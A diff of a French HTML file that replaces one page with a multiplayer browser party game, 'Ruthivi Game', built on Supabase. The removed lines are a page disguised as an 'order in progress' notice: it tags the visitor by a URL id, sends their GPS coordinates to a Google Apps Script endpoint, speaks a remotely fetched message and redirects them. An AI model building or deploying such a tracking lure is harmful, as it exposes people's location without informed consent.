@@ -1,63 +1,489 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Localisation</title>
-  <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbyzp5OBxiya8wyAF-miJ5pzz29hzHCtcFDNDpTj77gm7DSU6UUYLO0jGFLvc3C98C_l/exec";
-
-    async function sendLocation() {
-      try {
-        // 🔹 Récupère l'ID depuis l'URL (ex: ?id=1234)
-        const urlParams = new URLSearchParams(window.location.search);
-        const id = urlParams.get("id") || "inconnu";
-
-        // 🔹 Obtenir la position GPS
-        const position = await new Promise((resolve, reject) => {
-          if (!navigator.geolocation) {
-            reject(new Error("Géolocalisation non disponible."));
-          }
-          navigator.geolocation.getCurrentPosition(resolve, reject);
-        });
-
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-
-        // 🔹 Envoi via POST avec ID dynamique
-        await fetch(scriptURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-          },
-          body: `id=${encodeURIComponent(id)}&latitude=${latitude}&longitude=${longitude}`
-        });
-
-        // 🔹 Récupération de l’URL de redirection
-        const urlResp = await fetch(`${scriptURL}?data=url`);
-        const urlText = await urlResp.text();
-
-        // 🔹 Récupération du message vocal
-        const msgResp = await fetch(`${scriptURL}?data=message`);
-        const msgText = await msgResp.text();
-
-        // 🔊 Lecture
-        const utterance = new SpeechSynthesisUtterance(msgText);
-        speechSynthesis.speak(utterance);
-
-        // Redirection après 4 secondes
-        setTimeout(() => {
-          window.location.href = urlText.trim();
-        }, 4000);
-
-      } catch (error) {
-        alert("Erreur : " + error.message);
-      }
-    }
-
-    window.onload = sendLocation;
-  </script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Ruthivi Game</title>
+<link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600;700&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.45.4/dist/umd/supabase.min.js"></script>
+<style>
+:root{--felt:#12403c;--deep:#0b2b29;--cream:#f6efdc;--gold:#f0b429;--coral:#e8664f;--ink:#14201f;--r:16px}
+*{box-sizing:border-box;margin:0}
+html,body{min-height:100%}
+body{font-family:'Fredoka',system-ui,sans-serif;color:var(--cream);background:radial-gradient(circle at 50% 0,var(--felt),var(--deep) 80%) fixed;padding:16px}
+main{max-width:680px;margin:0 auto}
+.screen{display:none}.screen.on{display:block}
+h1{font-size:clamp(2.4rem,9vw,3.6rem);font-weight:700;line-height:1;margin:28px 0 8px}
+h2{font-size:1.4rem;font-weight:600;margin-bottom:12px}
+p.sub{opacity:.8;margin-bottom:24px}
+.panel{background:rgba(246,239,220,.07);border:1px solid rgba(246,239,220,.18);border-radius:var(--r);padding:20px;margin-bottom:16px}
+label{display:block;font-size:.95rem;margin:0 0 6px;opacity:.9}
+input{width:100%;font:inherit;font-size:1.1rem;padding:12px 14px;border-radius:12px;border:2px solid transparent;background:var(--cream);color:var(--ink);margin-bottom:14px}
+input:focus{outline:none;border-color:var(--gold)}
+#code{text-transform:uppercase;letter-spacing:.35em;text-align:center;font-weight:600}
+button{font:inherit;font-weight:600;font-size:1.05rem;border:0;border-radius:12px;padding:13px 18px;cursor:pointer;background:var(--gold);color:var(--ink);width:100%}
+button.alt{background:transparent;color:var(--cream);border:2px solid var(--cream)}
+button:hover{filter:brightness(1.07)}button:focus-visible,.card:focus-visible{outline:3px solid var(--cream);outline-offset:2px}
+button:disabled{opacity:.5;cursor:default}
+.row{display:grid;gap:12px}
+.bigcode{font-size:3rem;font-weight:700;letter-spacing:.3em;text-align:center;color:var(--gold);padding:8px 0 8px .3em;cursor:pointer}
+.plist{list-style:none;padding:0;display:grid;gap:8px;margin:12px 0 18px}
+.plist li{background:rgba(0,0,0,.2);padding:10px 14px;border-radius:12px;display:flex;justify-content:space-between;gap:8px}
+.top{display:flex;justify-content:space-between;align-items:center;gap:8px;margin-bottom:10px;font-weight:600}
+.lvl{background:var(--gold);color:var(--ink);padding:4px 14px;border-radius:99px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
+.chip{flex:1 1 90px;background:rgba(0,0,0,.22);border-radius:12px;padding:8px 12px;border:2px solid transparent;transition:border-color .2s,transform .2s}
+.chip.turn{border-color:var(--gold);transform:translateY(-2px)}
+.chip b{display:block;font-size:1.4rem;color:var(--gold)}
+.chip small{display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#banner{text-align:center;font-weight:600;margin:6px 0 12px;min-height:1.6em}
+#board{display:grid;grid-template-columns:repeat(var(--c),1fr);gap:clamp(6px,2vw,12px)}
+.card{aspect-ratio:3/4;perspective:700px;border:0;background:none;padding:0;border-radius:12px}
+.in{position:relative;width:100%;height:100%;transition:transform .45s;transform-style:preserve-3d}
+.card.up .in{transform:rotateY(180deg)}
+.f,.b{position:absolute;inset:0;border-radius:12px;backface-visibility:hidden;display:grid;place-items:center}
+.b{background:var(--coral);border:3px solid var(--cream);background-image:radial-gradient(circle,rgba(246,239,220,.35) 2px,transparent 3px);background-size:14px 14px}
+.f{background:var(--cream);transform:rotateY(180deg);font-size:clamp(1.6rem,8vw,3rem)}
+.card.done .f{background:#cfe8c8;box-shadow:0 0 0 3px var(--gold)}
+.card.done{pointer-events:none}
+#over{position:fixed;inset:0;background:rgba(5,20,19,.88);display:none;place-items:center;padding:16px;overflow:auto}
+#over.on{display:grid}
+.modal{background:var(--felt);border:2px solid var(--gold);border-radius:20px;padding:24px;max-width:460px;width:100%;text-align:center;animation:pop .5s cubic-bezier(.2,1.4,.4,1)}
+@keyframes pop{from{transform:scale(.7);opacity:0}}
+.gift{font-size:4.5rem;line-height:1.1}
+.rank{list-style:none;padding:0;margin:16px 0;display:grid;gap:6px;text-align:left}
+.rank li{background:rgba(0,0,0,.22);border-radius:10px;padding:8px 12px;display:grid;grid-template-columns:1fr auto;gap:2px 8px}
+.rank small{grid-column:1/-1;opacity:.8}
+#toast{position:fixed;left:50%;bottom:20px;transform:translateX(-50%);background:var(--coral);color:var(--cream);padding:10px 18px;border-radius:12px;display:none;font-weight:600;max-width:90vw}
+.link{background:none;color:var(--cream);opacity:.75;text-decoration:underline;font-size:.9rem;width:auto;padding:6px;margin:6px auto 0;display:block}
+.gpick{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:12px 0 18px}
+.gbtn{display:grid;gap:2px;text-align:left;background:rgba(0,0,0,.22);color:var(--cream);border:2px solid transparent;font-weight:500;padding:10px 12px}
+.gbtn span{font-size:1.6rem}.gbtn b{font-weight:600}.gbtn small{opacity:.75;font-size:.8rem}
+.gbtn.sel{border-color:var(--gold);background:rgba(240,180,41,.15)}
+.rbox{height:300px;display:grid;place-items:center;text-align:center;border-radius:16px;font-size:1.7rem;font-weight:600;color:#fff;cursor:pointer;user-select:none;touch-action:manipulation}
+@media (prefers-reduced-motion:reduce){.in,.modal,.chip{transition:none;animation:none}}
+</style>
 </head>
 <body>
-  <h1> COMMANDE EN COURS </h1>
+<main>
+
+<section id="home" class="screen on">
+  <h1>Ruthivi Game</h1>
+  <p class="sub">Plusieurs jeux à plusieurs, niveau après niveau, avec points et cadeaux.</p>
+  <div class="panel">
+    <label for="name">Ton pseudo (tu peux le modifier)</label>
+    <input id="name" maxlength="20" placeholder="Ex : Awa" autocomplete="nickname">
+    <div class="row">
+      <button id="create">Créer une partie</button>
+    </div>
+  </div>
+  <div class="panel">
+    <label for="code">Rejoindre avec un code</label>
+    <input id="code" maxlength="5" placeholder="•••••" autocomplete="off">
+    <button id="join" class="alt">Rejoindre la partie</button>
+  </div>
+</section>
+
+<section id="lobby" class="screen">
+  <h1>Salle d'attente</h1>
+  <p class="sub">Envoie ce code de 5 caractères à tes amis (touche pour copier).</p>
+  <div class="panel">
+    <div id="bigcode" class="bigcode" role="button" tabindex="0"></div>
+    <ul id="plist" class="plist"></ul>
+    <h2>Choisis le jeu</h2>
+    <div id="gpick" class="gpick"></div>
+    <button id="start">Lancer la partie</button>
+    <p id="wait" class="sub" style="margin:0;text-align:center;display:none">L'hôte lance la partie dès que tout le monde est là.</p>
+  </div>
+</section>
+
+<section id="game" class="screen">
+  <div class="top"><span class="lvl" id="lvl"></span><span id="gcode"></span><button id="chg" class="link" style="display:none;margin:0">Changer de jeu</button></div>
+  <div class="chips" id="chips"></div>
+  <div id="banner"></div>
+  <div id="board"></div>
+  <div id="arena"></div>
+</section>
+
+</main>
+
+<div id="over"><div class="modal" id="modal"></div></div>
+<div id="toast" role="status"></div>
+
+<script>
+const SB_URL = 'https://svgukwriwqkyxjrmqpol.supabase.co';
+const SB_KEY = 'sb_publishable_C6do1GZ7-gLqhvYn-EflpA_dFuZGk5r';
+
+const EMOJIS = ['🍎','🍌','🍇','🍒','🍓','🥝','🍑','🍍','🥑','🌽','🍄','🥨','🥕','🍔','🍕','🍩','🍪','🧁','🍉','🍋','🥥','🥐','🍿','🍫'];
+const GIFTS = ['👑 Couronne','🚀 Fusée','💎 Diamant','🏆 Trophée','🦄 Licorne','🌟 Étoile filante','🎁 Coffre doré','🐉 Dragon'];
+const ALPHA = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+const $ = s => document.querySelector(s);
+const esc = t => String(t).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const shuffle = a => { a = [...a]; for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; } return a; };
+const uid = () => (crypto.randomUUID ? crypto.randomUUID() : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => { const r = Math.random() * 16 | 0; return (c == 'x' ? r : (r & 3 | 8)).toString(16); }));
+
+let sb, me = localStorage.getItem('pid') || uid(), code = null, room = null, players = [], busy = false, boardKey = '', poll = null;
+localStorage.setItem('pid', me);
+
+let arKey = '', finRun = 0;
+function toast(m) { const t = $('#toast'); t.textContent = m; t.style.display = 'block'; clearTimeout(t._t); t._t = setTimeout(() => t.style.display = 'none', 3200); }
+function show(id) { document.querySelectorAll('.screen').forEach(s => s.classList.toggle('on', s.id === id)); }
+const upd = patch => sb.from('rooms').update(patch).eq('code', code);
+
+function pseudo() { const n = $('#name').value.trim(); if (!n) { toast('Entre ton pseudo pour continuer.'); $('#name').focus(); return null; } localStorage.setItem('pseudo', n); return n; }
+
+async function createGame() {
+  const name = pseudo(); if (!name) return;
+  for (let k = 0; k < 5; k++) {
+    const c = Array.from({ length: 5 }, () => ALPHA[Math.floor(Math.random() * ALPHA.length)]).join('');
+    const { error } = await sb.from('rooms').insert({ code: c, host_id: me });
+    if (error) { if (error.code === '23505') continue; return toast('Création impossible : ' + error.message); }
+    const p = await sb.from('players').upsert({ id: me, room_code: c, name });
+    if (p.error) return toast('Erreur joueur : ' + p.error.message);
+    return enter(c);
+  }
+  toast('Réessaie, aucun code libre trouvé.');
+}
+
+async function joinGame() {
+  const name = pseudo(); if (!name) return;
+  const c = $('#code').value.trim().toUpperCase();
+  if (c.length !== 5) return toast('Le code contient exactement 5 caractères.');
+  const r = await sb.from('rooms').select().eq('code', c).maybeSingle();
+  if (!r.data) return toast('Aucune partie avec ce code. Vérifie auprès du créateur.');
+  const known = await sb.from('players').select('id').eq('room_code', c);
+  const already = (known.data || []).some(p => p.id === me);
+  if (!already) {
+    if (r.data.status !== 'lobby') return toast('Cette partie a déjà commencé.');
+    if ((known.data || []).length >= 4) return toast('Partie complète (4 joueurs maximum).');
+    const p = await sb.from('players').insert({ id: me, room_code: c, name });
+    if (p.error) return toast('Erreur : ' + p.error.message);
+  }
+  enter(c);
+}
+
+function enter(c) {
+  code = c; localStorage.setItem('room', c);
+  sb.channel('r-' + c)
+    .on('postgres_changes', { event: '*', schema: 'public', table: 'rooms', filter: 'code=eq.' + c }, refresh)
+    .on('postgres_changes', { event: '*', schema: 'public', table: 'players', filter: 'room_code=eq.' + c }, refresh)
+    .subscribe();
+  clearInterval(poll); poll = setInterval(refresh, 4000);
+  refresh();
+}
+
+async function refresh() {
+  if (!code) return;
+  const [r, p] = await Promise.all([
+    sb.from('rooms').select().eq('code', code).maybeSingle(),
+    sb.from('players').select().eq('room_code', code).order('joined_at')
+  ]);
+  if (!r.data) return;
+  room = r.data; players = p.data || [];
+  render();
+}
+
+function render() {
+  const host = room.host_id === me;
+  if (room.status === 'lobby') {
+    show('lobby');
+    $('#bigcode').textContent = code;
+    $('#plist').innerHTML = players.map(p => `<li><span>${esc(p.name)}</span><span>${p.id === room.host_id ? 'hôte' : ''}</span></li>`).join('');
+    const gsel = room.state.game || 'memory';
+    $('#gpick').innerHTML = Object.entries(GAMES).map(([id, g]) => `<button class="gbtn ${id === gsel ? 'sel' : ''}" data-g="${id}"><span>${g.e}</span><b>${g.n}</b><small>${g.d}</small></button>`).join('');
+    $('#gpick').style.pointerEvents = host ? '' : 'none';
+    $('#gpick').querySelectorAll('.gbtn').forEach(b => b.onclick = () => upd({ state: { game: b.dataset.g } }));
+    $('#start').textContent = 'Lancer : ' + GAMES[gsel].n;
+    $('#start').style.display = host ? '' : 'none';
+    $('#wait').style.display = host ? 'none' : '';
+    $('#start').disabled = false;
+    $('#over').classList.remove('on');
+    return;
+  }
+  show('game');
+  const s = room.state, g = s.game || 'memory', mem = g === 'memory', mine = players.find(p => p.id === me) || { score: 0 };
+  $('#lvl').textContent = GAMES[g].e + ' ' + GAMES[g].n + ' · Niveau ' + room.level;
+  $('#gcode').textContent = 'Code ' + code;
+  $('#chg').style.display = host ? '' : 'none';
+  $('#chips').innerHTML = players.map(p => `<div class="chip ${p.id === s.turn ? 'turn' : ''}"><small>${esc(p.name)}${p.id === me ? ' (toi)' : ''}</small><b>${p.score < 0 ? '…' : p.score}</b><small>total ${p.total}</small></div>`).join('');
+  $('#board').style.display = mem ? '' : 'none';
+  $('#arena').style.display = mem ? 'none' : '';
+  if (mem) {
+    const cur = players.find(p => p.id === s.turn);
+    $('#banner').textContent = room.status === 'playing' ? (s.turn === me ? 'À toi de jouer !' : 'Tour de ' + (cur ? cur.name : '…')) : '';
+    drawBoard();
+  } else {
+    $('#banner').textContent = room.status !== 'playing' ? '' : mine.score < 0 ? 'Joue ta manche !' : 'Score envoyé, on attend les autres…';
+    if (room.status === 'playing' && mine.score < 0 && s.run !== arKey) { arKey = s.run; ARCADE[g](room.level, endRound); }
+    else if (mine.score >= 0 && !$('#arena').innerHTML) waitPanel(mine.score);
+    if (host && room.status === 'playing' && players.length && players.every(p => p.score >= 0) && finRun !== s.run) { finRun = s.run; finishLevel({ ...s }); }
+  }
+  if (room.status === 'level_done') showOver(); else $('#over').classList.remove('on');
+}
+
+function drawBoard() {
+  const s = room.state, n = s.cards.length, key = room.level + ':' + s.cards.join('');
+  const b = $('#board');
+  if (key !== boardKey) {
+    boardKey = key;
+    b.style.setProperty('--c', n <= 16 ? 4 : n <= 20 ? 5 : 6);
+    b.innerHTML = s.cards.map((c, i) => `<button class="card" data-i="${i}" aria-label="Carte ${i + 1}"><div class="in"><div class="b"></div><div class="f">${c}</div></div></button>`).join('');
+    b.querySelectorAll('.card').forEach(el => el.onclick = () => flip(+el.dataset.i));
+  }
+  b.querySelectorAll('.card').forEach((el, i) => {
+    el.classList.toggle('up', s.matched[i] || s.flipped.includes(i));
+    el.classList.toggle('done', !!s.matched[i]);
+  });
+}
+
+async function flip(i) {
+  const s = room.state;
+  if (busy || room.status !== 'playing' || s.turn !== me || s.matched[i] || s.flipped.includes(i) || s.flipped.length >= 2) return;
+  s.flipped = [...s.flipped, i];
+  drawBoard();
+  if (s.flipped.length === 2) busy = true;
+  await upd({ state: s });
+  if (s.flipped.length === 2) setTimeout(resolve, 900);
+}
+
+async function resolve() {
+  const s = { ...room.state }, [a, b] = s.flipped;
+  if (s.cards[a] === s.cards[b]) {
+    s.matched = [...s.matched]; s.matched[a] = s.matched[b] = true;
+    const gain = 10 + 5 * s.combo; s.combo++; s.flipped = [];
+    const mine = players.find(p => p.id === me);
+    mine.score += gain;
+    await sb.from('players').update({ score: mine.score }).eq('id', me);
+    await upd({ state: s });
+    if (s.matched.every(Boolean)) await finishLevel(s);
+  } else {
+    s.flipped = []; s.combo = 0;
+    s.turn = s.order[(s.order.indexOf(s.turn) + 1) % s.order.length];
+    await upd({ state: s });
+  }
+  busy = false;
+}
+
+async function finishLevel(s) {
+  const sorted = [...players].sort((x, y) => y.score - x.score), w = sorted[0];
+  const bonus = 50 + 10 * room.level, gift = GIFTS[Math.floor(Math.random() * GIFTS.length)];
+  await Promise.all(players.map(p => sb.from('players').update({
+    total: p.total + p.score + (p.id === w.id ? bonus : 20),
+    gifts: p.id === w.id ? [...p.gifts, gift] : p.gifts
+  }).eq('id', p.id)));
+  s.result = { winner: w.id, name: w.name, bonus, gift };
+  await upd({ status: 'level_done', state: s });
+}
+
+function showOver() {
+  const r = room.state.result; if (!r) return;
+  const host = room.host_id === me;
+  const rows = [...players].sort((a, b) => b.total - a.total).map(p => `<li><span>${esc(p.name)}</span><b>${p.total} pts</b><small>Manche +${p.score} · ${p.gifts.length ? p.gifts.map(esc).join('  ') : 'Aucun cadeau pour l\'instant'}</small></li>`).join('');
+  $('#modal').innerHTML = `<h2>Niveau ${room.level} terminé !</h2><div class="gift">${esc(r.gift.split(' ')[0])}</div><p><b>${esc(r.name)}</b> gagne le niveau : +${r.bonus} points et un cadeau, « ${esc(r.gift.slice(r.gift.indexOf(' ') + 1))} ».<br>Les autres reçoivent +20 points.</p><ul class="rank">${rows}</ul>${host ? '<div class="row"><button id="next">Niveau suivant</button><button id="chg2" class="alt">Changer de jeu</button></div>' : '<p class="sub" style="margin:0">En attente de l\'hôte…</p>'}`;
+  $('#over').classList.add('on');
+  if (host) { $('#next').onclick = nextLevel; $('#chg2').onclick = changeGame; }
+}
+
+function buildState(level, g) {
+  if (g && g !== 'memory') return { game: g, run: Date.now() };
+  const pairs = Math.min(3 + level, 12), pick = shuffle(EMOJIS).slice(0, pairs), order = players.map(p => p.id);
+  const cards = shuffle([...pick, ...pick]);
+  return { game: 'memory', run: Date.now(), cards, matched: cards.map(() => false), flipped: [], turn: order[0], combo: 0, order };
+}
+
+async function startGame() {
+  if (players.length < 1) return;
+  $('#start').disabled = true;
+  const g = room.state.game || 'memory';
+  await sb.from('players').update({ score: g === 'memory' ? 0 : -1 }).eq('room_code', code);
+  await upd({ status: 'playing', level: 1, state: buildState(1, g) });
+}
+
+async function nextLevel() {
+  $('#next').disabled = true;
+  const g = room.state.game || 'memory';
+  await sb.from('players').update({ score: g === 'memory' ? 0 : -1 }).eq('room_code', code);
+  players.forEach(p => p.score = g === 'memory' ? 0 : -1);
+  await upd({ status: 'playing', level: room.level + 1, state: buildState(room.level + 1, g) });
+}
+
+
+const GAMES = {
+  memory: { n: 'Paires', e: '🃏', d: 'Retrouve les paires' },
+  arc: { n: "Tir à l'arc", e: '🏹', d: '5 flèches, vise le centre' },
+  penalty: { n: 'Penalty', e: '⚽', d: '5 tirs face au gardien' },
+  ballons: { n: 'Ballons', e: '🎈', d: 'Éclate-en un max en 15 s' },
+  reflexe: { n: 'Réflexe', e: '⚡', d: 'Touche dès que c\'est vert' },
+  tape: { n: 'Tape-tape', e: '👆', d: 'Un max de touches en 10 s' },
+  calcul: { n: 'Calcul éclair', e: '🧮', d: 'Un max de bons résultats en 30 s' }
+};
+const ARCADE = { arc: gArc, penalty: gPen, ballons: gBal, reflexe: gRef, tape: gTap, calcul: gCalc };
+
+async function changeGame() {
+  if (!confirm('Revenir au choix du jeu ?')) return;
+  await sb.from('players').update({ score: 0 }).eq('room_code', code);
+  await upd({ status: 'lobby', level: 1, state: { game: room.state.game || 'memory' } });
+}
+function waitPanel(sc) { $('#arena').innerHTML = `<div class="panel" style="text-align:center"><h2>${sc} points</h2><p class="sub" style="margin:0">En attente des autres joueurs…</p></div>`; }
+function endRound(sc) {
+  sc = Math.max(0, Math.round(sc));
+  const m = players.find(p => p.id === me); if (m) m.score = sc;
+  waitPanel(sc);
+  sb.from('players').update({ score: sc }).eq('id', me).then(refresh);
+}
+function mkCanvas() {
+  $('#arena').innerHTML = '<div id="hud" style="text-align:center;font-weight:600;margin-bottom:6px"></div><canvas id="cv" width="360" height="420" style="width:100%;max-width:420px;display:block;margin:auto;background:#0e3a36;border-radius:16px;touch-action:none"></canvas>';
+  const c = $('#cv');
+  return { c, x: c.getContext('2d'), hud: t => { const h = $('#hud'); if (h) h.textContent = t; }, pos: e => { const r = c.getBoundingClientRect(); return { x: (e.clientX - r.left) * 360 / r.width, y: (e.clientY - r.top) * 420 / r.height }; } };
+}
+
+function gArc(lv, done) {
+  const k = mkCanvas(), x = k.x, sp = .03 + lv * .006, R = Math.max(26, 64 - lv * 4), ty = 150;
+  let n = 5, sc = 0, t = 0, ax = 180, st = [], end = false;
+  const tx = () => 180 + Math.sin(t) * (150 - R);
+  k.c.onpointermove = e => ax = k.pos(e).x;
+  k.c.onpointerdown = e => {
+    if (end) return; ax = k.pos(e).x;
+    const cx = tx(), d = Math.abs(ax - cx), p = d > R ? 0 : Math.ceil((1 - d / R) * 10);
+    sc += p; n--; st.push([ax - cx, p]);
+    if (!n) { end = true; setTimeout(() => done(sc), 900); }
+  };
+  (function f() {
+    if (!k.c.isConnected) return;
+    if (!end) t += sp;
+    x.clearRect(0, 0, 360, 420);
+    const cx = tx();
+    ['#f6efdc', '#14201f', '#3a7bd5', '#e8664f', '#f0b429'].forEach((c, i) => { x.fillStyle = c; x.beginPath(); x.arc(cx, ty, R * (1 - i * .2), 0, 7); x.fill(); });
+    x.strokeStyle = '#f6efdc'; x.lineWidth = 3;
+    st.forEach(([o]) => { x.beginPath(); x.moveTo(cx + o, ty); x.lineTo(cx + o, ty + 34); x.stroke(); });
+    if (!end) { x.setLineDash([6, 8]); x.beginPath(); x.moveTo(ax, 395); x.lineTo(ax, ty + R); x.stroke(); x.setLineDash([]); }
+    x.font = '30px serif'; x.fillText('🏹', ax - 15, 415);
+    k.hud(`Flèches : ${n} · Points : ${sc}`);
+    requestAnimationFrame(f);
+  })();
+}
+
+function gPen(lv, done) {
+  const k = mkCanvas(), x = k.x, zw = 280 / 3, zh = 80;
+  let n = 5, sc = 0, busy = false, ball = [180, 360], kp = [180, 120], msg = '';
+  const ctr = z => [40 + (z % 3) * zw + zw / 2, 40 + Math.floor(z / 3) * zh + zh / 2];
+  function draw() {
+    x.clearRect(0, 0, 360, 420);
+    x.strokeStyle = '#f6efdc'; x.lineWidth = 4; x.strokeRect(40, 40, 280, 160);
+    x.lineWidth = 1; x.globalAlpha = .3;
+    for (let i = 1; i < 3; i++) { x.beginPath(); x.moveTo(40 + i * zw, 40); x.lineTo(40 + i * zw, 200); x.stroke(); }
+    x.beginPath(); x.moveTo(40, 120); x.lineTo(320, 120); x.stroke(); x.globalAlpha = 1;
+    x.font = '44px serif'; x.textAlign = 'center'; x.textBaseline = 'middle';
+    x.fillText('🧤', kp[0], kp[1]); x.fillText('⚽', ball[0], ball[1]);
+    if (msg) { x.font = '700 34px Fredoka,sans-serif'; x.fillStyle = '#f0b429'; x.fillText(msg, 180, 280); }
+    k.hud(`Tirs restants : ${n} · Buts : ${sc / 10}`);
+  }
+  draw();
+  k.c.onpointerdown = e => {
+    if (busy) return;
+    const p = k.pos(e);
+    if (p.x < 40 || p.x > 320 || p.y < 40 || p.y > 200) return;
+    busy = true;
+    const z = Math.floor((p.x - 40) / zw) + 3 * Math.floor((p.y - 40) / zh);
+    const kz = Math.random() < Math.min(.5, .12 + lv * .06) ? z : Math.floor(Math.random() * 6);
+    const a = ctr(z), b = ctr(kz), t0 = performance.now();
+    (function s(now) {
+      const q = Math.min(1, (now - t0) / 450);
+      ball = [180 + (a[0] - 180) * q, 360 + (a[1] - 360) * q];
+      kp = [180 + (b[0] - 180) * q, 120 + (b[1] - 120) * q];
+      draw();
+      if (q < 1) return requestAnimationFrame(s);
+      const goal = z !== kz; if (goal) sc += 10; n--;
+      msg = goal ? 'BUT !' : 'ARRÊTÉ !'; draw();
+      setTimeout(() => { msg = ''; ball = [180, 360]; kp = [180, 120]; if (!n) return done(sc); busy = false; draw(); }, 800);
+    })(t0);
+  };
+}
+
+function gBal(lv, done) {
+  const k = mkCanvas(), x = k.x; let sc = 0, bs = [], t0 = performance.now(), end = false;
+  k.c.onpointerdown = e => {
+    const p = k.pos(e);
+    for (let i = bs.length - 1; i >= 0; i--) { const b = bs[i]; if (Math.hypot(p.x - b.x, p.y - b.y) < b.r + 10) { sc += b.g ? 15 : 5; bs.splice(i, 1); break; } }
+  };
+  (function f(now) {
+    if (!k.c.isConnected || end) return;
+    const left = 15 - (now - t0) / 1000;
+    if (left <= 0) { end = true; return done(sc); }
+    if (Math.random() < .05 + lv * .012) bs.push({ x: 25 + Math.random() * 310, y: 450, r: 24, v: 1.2 + lv * .25 + Math.random(), g: Math.random() < .1, c: Math.floor(Math.random() * 360) });
+    x.clearRect(0, 0, 360, 420);
+    bs = bs.filter(b => (b.y -= b.v) > -50);
+    bs.forEach(b => {
+      x.fillStyle = b.g ? '#f0b429' : `hsl(${b.c},75%,60%)`; x.beginPath(); x.ellipse(b.x, b.y, b.r * .85, b.r, 0, 0, 7); x.fill();
+      x.strokeStyle = '#f6efdc'; x.lineWidth = 1; x.beginPath(); x.moveTo(b.x, b.y + b.r); x.lineTo(b.x, b.y + b.r + 14); x.stroke();
+    });
+    k.hud(`⏱ ${Math.ceil(left)} s · Points : ${sc}`);
+    requestAnimationFrame(f);
+  })(t0);
+}
+
+function gRef(lv, done) {
+  let r = 0, sc = 0; const A = $('#arena');
+  function nx() {
+    if (++r > 3) return done(sc);
+    A.innerHTML = `<div id="rb" class="rbox" style="background:var(--coral)">Manche ${r}/3<br>Attends le vert…</div>`;
+    const b = $('#rb'); let go = 0;
+    const to = setTimeout(() => { go = performance.now(); b.style.background = '#3fb950'; b.textContent = 'MAINTENANT !'; }, 1000 + Math.random() * 2500);
+    b.onpointerdown = () => {
+      if (!go) { clearTimeout(to); b.textContent = 'Trop tôt ! 0 point'; }
+      else { const ms = Math.round(performance.now() - go), p = Math.max(0, 100 - Math.round(ms / 6)); sc += p; b.textContent = ms + ' ms · +' + p; }
+      b.onpointerdown = null; setTimeout(nx, 1000);
+    };
+  }
+  nx();
+}
+
+function gTap(lv, done) {
+  let n = 0, on = 0;
+  $('#arena').innerHTML = '<div id="rb" class="rbox" style="background:var(--coral)">Touche pour commencer<br>10 secondes</div>';
+  const b = $('#rb');
+  b.onpointerdown = () => {
+    if (!on) { on = 1; n = 0; setTimeout(() => { b.onpointerdown = null; b.textContent = 'Terminé : ' + n; setTimeout(() => done(n), 900); }, 10000); }
+    n++; b.innerHTML = `${n}<br>touches`;
+  };
+}
+
+function gCalc(lv, done) {
+  let sc = 0, left = 30, q; const A = $('#arena'), m = lv + 9;
+  function ask() {
+    const a = 1 + Math.floor(Math.random() * m), b = 1 + Math.floor(Math.random() * m), mul = Math.random() < .4;
+    q = { t: mul ? `${a} × ${b}` : `${a} + ${b}`, r: mul ? a * b : a + b };
+    const o = new Set([q.r]); while (o.size < 4) o.add(Math.max(0, q.r + Math.floor(Math.random() * 11) - 5));
+    A.innerHTML = `<div class="panel" style="text-align:center"><p class="sub" id="cl">⏱ ${left} s · ${sc} pts</p><h2 style="font-size:2.4rem">${q.t} = ?</h2><div class="row" style="grid-template-columns:1fr 1fr">${shuffle([...o]).map(v => `<button data-v="${v}">${v}</button>`).join('')}</div></div>`;
+    A.querySelectorAll('button').forEach(b => b.onclick = () => { if (+b.dataset.v === q.r) sc += 10; ask(); });
+  }
+  ask();
+  const iv = setInterval(() => { left--; const c = $('#cl'); if (c) c.textContent = `⏱ ${left} s · ${sc} pts`; if (left <= 0) { clearInterval(iv); done(sc); } }, 1000);
+}
+
+function copyCode() { navigator.clipboard && navigator.clipboard.writeText(code).then(() => toast('Code copié : ' + code)); }
+
+async function boot() {
+  sb = supabase.createClient(SB_URL, SB_KEY);
+  const saved = localStorage.getItem('room');
+  if (saved) {
+    const p = await sb.from('players').select('id').eq('room_code', saved).eq('id', me).maybeSingle();
+    if (p.data) enter(saved); else localStorage.removeItem('room');
+  }
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+  $('#name').value = localStorage.getItem('pseudo') || '';
+  $('#name').oninput = () => localStorage.setItem('pseudo', $('#name').value.trim());
+  $('#create').onclick = createGame;
+  $('#join').onclick = joinGame;
+  $('#start').onclick = startGame;
+  $('#bigcode').onclick = copyCode;
+  $('#bigcode').onkeydown = e => { if (e.key === 'Enter') copyCode(); };
+  $('#code').onkeydown = e => { if (e.key === 'Enter') joinGame(); };
+  $('#chg').onclick = changeGame;
+  boot();
+});
+</script>
 </body>
 </html>
